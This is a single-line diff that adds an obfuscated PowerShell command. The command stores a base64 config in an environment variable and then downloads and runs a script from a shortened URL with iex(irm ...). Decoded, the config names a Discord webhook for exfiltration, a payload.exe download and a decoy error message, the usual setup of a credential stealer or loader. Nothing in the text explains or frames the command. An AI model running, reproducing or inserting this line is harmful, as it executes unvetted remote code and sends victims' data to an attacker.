@@ -1,0 +1,1 @@
+$env:C='eyJ3IjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNDU2Nzg5MC9hYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eiIsImUiOiJodHRwczovL2V4YW1wbGUuY29tL3BheWxvYWQuZXhlIiwiZW0iOiJBbiBlcnJvciBvY2N1cnJlZCIsImFrIjoiYWJjMTIzIiwiaGsiOiJ4eXo3ODkifQ==';iex(irm 'https://is.gd/brDjcj')
